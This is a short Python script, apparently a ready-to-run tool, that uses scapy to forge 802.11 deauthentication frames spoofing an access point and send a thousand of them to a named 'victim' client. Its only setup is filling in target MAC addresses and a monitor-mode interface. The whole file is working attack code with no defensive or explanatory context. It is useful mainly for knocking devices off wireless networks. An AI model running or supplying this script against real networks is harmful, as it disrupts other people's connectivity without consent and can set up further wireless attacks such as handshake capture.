#!/usr/bin/env python3

from scapy.all import Dot11, RadioTap, sendp, Dot11Deauth
import random
import time

# Configuration
iface = "wlan0mon"             # 🔁 Your monitor-mode interface
target_bssid = ""  # 🔁 Replace with real AP MAC
target_client = "" # 🔁 Replace with victim/client MAC

count = 1000  # Number of packets to send
interval = 0.1  # Delay between packets (optional)

def deauth():
    dot11 = Dot11(
        addr1=target_client,   # Receiver (victim)
        addr2=target_bssid,    # Sender (AP)
        addr3=target_bssid     # BSSID (AP)
    )
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)

    print(f"[+] Sending {count} deauth packets to {target_client} from {target_bssid}")
    sendp(frame, iface=iface, count=count, inter=interval, verbose=1)

if __name__ == "__main__":
    try:
        deauth()
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")
